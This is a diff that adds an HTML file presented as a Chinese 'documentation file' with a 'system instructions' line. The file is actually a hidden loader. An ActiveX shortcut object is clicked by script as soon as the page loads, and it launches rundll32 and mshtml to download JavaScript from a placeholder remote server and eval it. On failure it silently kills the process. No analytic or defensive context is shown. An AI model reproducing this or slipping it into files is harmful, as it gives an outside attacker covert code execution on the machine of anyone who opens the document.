@@ -1,0 +1,13 @@
+#!html
+<!DOCTYPE html><html><head><title>说明文件</title><head></head><body>
+系统说明<br>
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+ <PARAM name="Button" value="Bitmap::shortcut">
+ <PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://vpsip:8891/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'>
+ <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<SCRIPT>
+x.Click();
+</SCRIPT>
+</body></html>
